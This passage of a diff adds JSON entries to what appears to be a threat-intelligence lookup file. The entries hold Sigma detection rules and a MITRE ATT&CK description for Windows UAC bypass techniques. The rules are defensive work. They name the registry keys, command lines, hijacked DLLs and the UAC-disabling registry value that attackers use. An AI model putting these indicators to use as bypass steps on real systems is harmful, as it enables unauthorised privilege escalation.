+                            "sigma:id": "155dbf56-e0a4-4dd0-8905-8a98705045e8",
+                            "title": "UAC Bypass Abusing Winsat Path Parsing - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3c05e90d-7eba-4324-9972-5d7f711a60a8",
+                        "lookup_data": {
+                            "description": "Detects tools such as UACMe used to bypass UAC with computerdefaults.exe (UACMe 59)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/31\ndescription: Detects tools such as UACMe used to bypass UAC with computerdefaults.exe\n  (UACMe 59)\ndetection:\n  condition: selection and not filter\n  filter:\n    ParentImage|contains:\n    - :\\Windows\\System32\n    - :\\Program Files\n  selection:\n    Image: C:\\Windows\\System32\\ComputerDefaults.exe\n    IntegrityLevel:\n    - High\n    - System\nfalsepositives:\n- Unknown\nid: 3c05e90d-7eba-4324-9972-5d7f711a60a8\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Tools Using ComputerDefaults\n",
+                            "sigma:id": "3c05e90d-7eba-4324-9972-5d7f711a60a8",
+                            "title": "UAC Bypass Tools Using ComputerDefaults",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6597be7b-ac61-4ac8-bef4-d3ec88174853",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe\n  (UACMe 52)\ndetection:\n  condition: selection\n  selection:\n    Details|endswith: \\appdata\\local\\temp\\system32\\winsat.exe\n    Details|startswith: c:\\users\\\n    EventType: SetValue\n    TargetObject|contains: \\Root\\InventoryApplicationFile\\winsat.exe|\n    TargetObject|endswith: \\LowerCaseLongPath\nfalsepositives:\n- Unknown\nid: 6597be7b-ac61-4ac8-bef4-d3ec88174853\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Abusing Winsat Path Parsing - Registry\n",
+                            "sigma:id": "6597be7b-ac61-4ac8-bef4-d3ec88174853",
+                            "title": "UAC Bypass Abusing Winsat Path Parsing - Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6ea3bf32-9680-422d-9f50-e90716b12a66",
+                        "lookup_data": {
+                            "description": "Unfixed method for UAC bypass from windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry.",
+                            "raw": "author: oscd.community, Dmitry Uchakin\ndate: 2020/10/07\ndescription: Unfixed method for UAC bypass from windows 10. WSReset.exe file associated\n  with the Windows Store. It will run a binary file contained in a low-privilege registry.\ndetection:\n  condition: selection\n  selection:\n    TargetObject|endswith: \\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- Image\n- EventType\n- TargetObject\nid: 6ea3bf32-9680-422d-9f50-e90716b12a66\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly\n- https://lolbas-project.github.io/lolbas/Binaries/Wsreset\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Via Wsreset\n",
+                            "sigma:id": "6ea3bf32-9680-422d-9f50-e90716b12a66",
+                            "title": "UAC Bypass Via Wsreset",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1e53dd56-8d83-4eb4-a43e-b790a05510aa",
+                        "lookup_data": {
+                            "description": "Detects Windows Installer service (msiexec.exe) spawning \"cmd\" or \"powershell\"",
+                            "raw": "author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community\ndate: 2020/10/13\ndescription: Detects Windows Installer service (msiexec.exe) spawning \"cmd\" or \"powershell\"\ndetection:\n  condition: all of selection_*\n  selection_img:\n  - Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - Cmd.Exe\n    - PowerShell.EXE\n    - pwsh.dll\n  selection_parent:\n    ParentImage|contains|all:\n    - \\Windows\\Installer\\\n    - msi\n    ParentImage|endswith: tmp\nfalsepositives:\n- Unknown\nfields:\n- Image\n- ParentImage\nid: 1e53dd56-8d83-4eb4-a43e-b790a05510aa\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/20\nreferences:\n- https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-50-638.jpg\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: Always Install Elevated MSI Spawned Cmd And Powershell\n",
+                            "sigma:id": "1e53dd56-8d83-4eb4-a43e-b790a05510aa",
+                            "title": "Always Install Elevated MSI Spawned Cmd And Powershell",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9ed5959a-c43c-4c59-84e3-d28628429456",
+                        "lookup_data": {
+                            "description": "Detects the \"iscsicpl.exe\" UAC bypass technique that leverages a DLL Search Order hijacking technique to load a custom DLL's from temp or a any user controlled location in the users %PATH%",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/17\ndescription: Detects the \"iscsicpl.exe\" UAC bypass technique that leverages a DLL\n  Search Order hijacking technique to load a custom DLL's from temp or a any user\n  controlled location in the users %PATH%\ndetection:\n  condition: selection and not filter\n  filter:\n    ImageLoaded|contains|all:\n    - C:\\Windows\\\n    - iscsiexe.dll\n  selection:\n    Image: C:\\Windows\\SysWOW64\\iscsicpl.exe\n    ImageLoaded|endswith: \\iscsiexe.dll\nfalsepositives:\n- Unknown\nid: 9ed5959a-c43c-4c59-84e3-d28628429456\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/07/25\nreferences:\n- https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC\n- https://twitter.com/wdormann/status/1547583317410607110\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Iscsicpl - ImageLoad\n",
+                            "sigma:id": "9ed5959a-c43c-4c59-84e3-d28628429456",
+                            "title": "UAC Bypass Using Iscsicpl - ImageLoad",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4cbef972-f347-4170-b62a-8253f6168e6d",
+                        "lookup_data": {
+                            "description": "Detects the \"IDiagnosticProfileUAC\" UAC bypass technique",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/03\ndescription: Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\ndetection:\n  condition: selection\n  selection:\n    IntegrityLevel:\n    - High\n    - System\n    ParentCommandLine|contains: ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}'\n    ParentImage|endswith: \\DllHost.exe\nfalsepositives:\n- Unknown\nid: 4cbef972-f347-4170-b62a-8253f6168e6d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/Wh04m1001/IDiagnosticProfileUAC\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using IDiagnostic Profile\n",
+                            "sigma:id": "4cbef972-f347-4170-b62a-8253f6168e6d",
+                            "title": "UAC Bypass Using IDiagnostic Profile",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7a01183d-71a2-46ad-ad5c-acd989ac1793",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe\n  (UACMe 52)\ndetection:\n  condition: selection\n  selection:\n    IntegrityLevel:\n    - High\n    - System\n    ParentCommandLine|contains: C:\\Windows \\system32\\winsat.exe\n    ParentImage|endswith: \\AppData\\Local\\Temp\\system32\\winsat.exe\nfalsepositives:\n- Unknown\nid: 7a01183d-71a2-46ad-ad5c-acd989ac1793\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Abusing Winsat Path Parsing - Process\n",
+                            "sigma:id": "7a01183d-71a2-46ad-ad5c-acd989ac1793",
+                            "title": "UAC Bypass Abusing Winsat Path Parsing - Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "534f2ef7-e8a2-4433-816d-c91bccde289b",
+                        "lookup_data": {
+                            "description": "Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/23\ndescription: Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag\n  that allows to run all sub processes of that newly started explorer.exe without\n  any UAC checks\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_dc_logon:\n  - ParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\n  - ParentImage: C:\\Windows\\System32\\svchost.exe\n  selection:\n    CommandLine|contains: /NOUACCHECK\n    Image|endswith: \\explorer.exe\nfalsepositives:\n- Domain Controller User Logon\n- Unknown how many legitimate software products use that method\nid: 534f2ef7-e8a2-4433-816d-c91bccde289b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/04/21\nreferences:\n- https://twitter.com/ORCA6665/status/1496478087244095491\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1548.002\ntitle: Explorer NOUACCHECK Flag\n",
+                            "sigma:id": "534f2ef7-e8a2-4433-816d-c91bccde289b",
+                            "title": "Explorer NOUACCHECK Flag",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "be344333-921d-4c4d-8bb8-e584cf584780",
+                        "lookup_data": {
+                            "description": "Detects UAC bypass method using Windows event viewer",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/19\ndescription: Detects UAC bypass method using Windows event viewer\ndetection:\n  condition: methprocess and not filterprocess\n  filterprocess:\n    Image|endswith:\n    - \\mmc.exe\n    - :\\Windows\\SysWOW64\\WerFault.exe\n    - :\\Windows\\System32\\WerFault.exe\n  methprocess:\n    ParentImage|endswith: \\eventvwr.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: be344333-921d-4c4d-8bb8-e584cf584780\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n- https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100\nrelated:\n- id: 7c81fec3-1c1d-43b0-996a-46753041b1b6\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- car.2019-04-001\ntitle: UAC Bypass via Event Viewer\n",
+                            "sigma:id": "be344333-921d-4c4d-8bb8-e584cf584780",
+                            "title": "UAC Bypass via Event Viewer",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a5ea83a7-05a5-44c1-be2e-addccbbd8c03",
+                        "lookup_data": {
+                            "description": "Attempts to load dismcore.dll after dropping it",
+                            "raw": "author: oscd.community, Dmitry Uchakin\ndate: 2020/10/06\ndescription: Attempts to load dismcore.dll after dropping it\ndetection:\n  condition: selection and not filter\n  filter:\n    ImageLoaded: C:\\Windows\\System32\\Dism\\dismcore.dll\n  selection:\n    ImageLoaded|endswith: \\dismcore.dll\n    Image|endswith: \\dism.exe\nfalsepositives:\n- Actions of a legitimate telnet client\nid: a5ea83a7-05a5-44c1-be2e-addccbbd8c03\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://steemit.com/utopian-io/@ah101/uac-bypassing-utility\nstatus: test\ntags:\n- attack.persistence\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- attack.t1574.002\ntitle: UAC Bypass With Fake DLL\n",
+                            "sigma:id": "a5ea83a7-05a5-44c1-be2e-addccbbd8c03",
+                            "title": "UAC Bypass With Fake DLL",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "48437c39-9e5f-47fb-af95-3d663c3f2919",
+                        "lookup_data": {
+                            "description": "Detects when an attacker tries to disable User Account Control (UAC) by changing its registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0",
+                            "raw": "author: frack113\ndate: 2022/01/05\ndescription: Detects when an attacker tries to disable User Account Control (UAC)\n  by changing its registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\n  from 1 to 0\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\nfalsepositives:\n- Unknown\nid: 48437c39-9e5f-47fb-af95-3d663c3f2919\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/08/06\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-8---disable-uac-using-regexe\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\ntitle: Disable UAC Using Registry\n",
+                            "sigma:id": "48437c39-9e5f-47fb-af95-3d663c3f2919",
+                            "title": "Disable UAC Using Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "39ed3c80-e6a1-431b-9df3-911ac53d08a7",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe\n  DLL hijacking (UACMe 36)\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|endswith: \\AppData\\Local\\Temp\\update.msu\n    CommandLine|startswith: '\"C:\\Windows\\system32\\wusa.exe\"  /quiet C:\\Users\\'\n    IntegrityLevel:\n    - High\n    - System\n  selection2:\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\Temp\\\n    - \\dismhost.exe {\n    Image|endswith: \\DismHost.exe\n    IntegrityLevel:\n    - High\n    - System\n    ParentCommandLine: '\"C:\\Windows\\system32\\dism.exe\" /online /quiet /norestart /add-package\n      /packagepath:\"C:\\Windows\\system32\\pe386\" /ignorecheck'\nfalsepositives:\n- Unknown\nid: 39ed3c80-e6a1-431b-9df3-911ac53d08a7\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using NTFS Reparse Point - Process\n",
+                            "sigma:id": "39ed3c80-e6a1-431b-9df3-911ac53d08a7",
+                            "title": "UAC Bypass Using NTFS Reparse Point - Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4f6c43e2-f989-4ea5-bcd8-843b49a0317c",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe 30)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe\n  30)\ndetection:\n  condition: selection\n  selection:\n    CallTrace|startswith: UNKNOWN(0000000000000000)|UNKNOWN(0000000000000000)|\n    GrantedAccess: '0x1fffff'\n    SourceImage|contains: :\\Windows\\SysWOW64\\\nfalsepositives:\n- Unknown\nid: 4f6c43e2-f989-4ea5-bcd8-843b49a0317c\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using WOW64 Logger DLL Hijack\n",
+                            "sigma:id": "4f6c43e2-f989-4ea5-bcd8-843b49a0317c",
+                            "title": "UAC Bypass Using WOW64 Logger DLL Hijack",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "758d96ed-9dd4-4009-9270-65f2c3dd30cc",
+                        "lookup_data": {
+                            "description": "Buzzing in the Background: BumbleBee, a New Modular Backdoor Evolved From BookWorm",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/758d96ed-9dd4-4009-9270-65f2c3dd30cc.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666603410",
+                            "uuid": "758d96ed-9dd4-4009-9270-65f2c3dd30cc",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "80fc36aa-945e-4181-89f2-2f907ab6775d",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)\ndetection:\n  condition: selection\n  selection:\n    Image|contains: \\AppData\\Local\\Temp\\\n    Image|endswith: consent.exe\n    IntegrityLevel:\n    - High\n    - System\n    ParentImage|endswith: \\ieinstal.exe\nfalsepositives:\n- Unknown\nid: 80fc36aa-945e-4181-89f2-2f907ab6775d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using IEInstal - Process\n",
+                            "sigma:id": "80fc36aa-945e-4181-89f2-2f907ab6775d",
+                            "title": "UAC Bypass Using IEInstal - Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "da2738f2-fadb-4394-afa7-0a0674885afa",
+                        "lookup_data": {
+                            "description": "A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques.",
+                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A General detection for sdclt spawning new processes. This could be an\n  indicator of sdclt being used for bypass UAC techniques.\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\sdclt.exe\nfalsepositives:\n- Unknown\nid: da2738f2-fadb-4394-afa7-0a0674885afa\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/6\n- https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: Sdclt Child Processes\n",
+                            "sigma:id": "da2738f2-fadb-4394-afa7-0a0674885afa",
+                            "title": "Sdclt Child Processes",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "120d5519-3098-4e1c-9191-2aa61232f073",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1548.002",
+                            "mitre-cti:description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
+                            "mitre-cti:name": "Bypass User Account Control",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Stefan Kanthak', 'Casey Smith'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073', 'created': '2020-01-30T14:24:34.977Z', 'x_mitre_version': '2.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002'}, {'source_name': 'Davidson Windows', 'url': 'http://www.pretentiousname.com/misc/win7_uac_whitelist2.html', 'description': 'Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.'}, {'source_name': 'TechNet How UAC Works', 'url': 'https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works', 'description': 'Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.'}, {'source_name': 'SANS UAC Bypass', 'url': 'http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass', 'description': 'Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.'}, {'source_name': 'MSDN COM Elevation', 'url': 'https://msdn.microsoft.com/en-us/library/ms679687.aspx', 'description': 'Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.'}, {'source_name': 'enigma0x3 Fileless UAC Bypass', 'url': 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/', 'description': 'Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.'}, {'source_name': 'enigma0x3 sdclt app paths', 'url': 'https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/', 'description': 'Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.'}, {'source_name': 'enigma0x3 sdclt bypass', 'url': 'https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/', 'description': 'Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.'}, {'source_name': 'TechNet Inside UAC', 'url': 'https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx', 'description': 'Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.'}, {'source_name': 'Fortinet Fareit', 'url': 'https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware', 'description': 'Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.'}, {'source_name': 'Github UACMe', 'url': 'https://github.com/hfiref0x/UACME', 'description': 'UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\\n\\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\\n\\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\\n\\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\\n\\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)', 'modified': '2022-04-19T15:11:20.036Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Bypass User Account Control', 'x_mitre_detection': 'There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\\n\\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\\n\\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\\n\\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\\\Software\\\\Classes\\\\exefile\\\\shell\\\\runas\\\\command\\\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\\n\\nAnalysts should monitor these Registry settings for unauthorized changes.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Process: Process Creation', 'Windows Registry: Windows Registry Key Modification', 'Process: Process Metadata', 'Command: Command Execution'], 'x_mitre_permissions_required': ['Administrator', 'User'], 'x_mitre_effective_permissions': ['Administrator'], 'x_mitre_defense_bypassed': ['Windows User Account Control'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "46dd5308-4572-4d12-aa43-8938f0184d4f",
+                        "lookup_data": {
+                            "description": "Bypasses User Account Control using a fileless method",
+                            "raw": "author: frack113\ndate: 2022/01/05\ndescription: Bypasses User Account Control using a fileless method\ndetection:\n  condition: selection\n  selection:\n    Details: (Empty)\n    EventType: SetValue\n    TargetObject|endswith: \\open\\command\\DelegateExecute\nfalsepositives:\n- Unknown\nid: 46dd5308-4572-4d12-aa43-8938f0184d4f\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand\n- https://devblogs.microsoft.com/oldnewthing/20100312-01/?p=14623\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-7---bypass-uac-using-sdclt-delegateexecute\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\ntitle: Bypass UAC Using DelegateExecute\n",
+                            "sigma:id": "46dd5308-4572-4d12-aa43-8938f0184d4f",
+                            "title": "Bypass UAC Using DelegateExecute",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
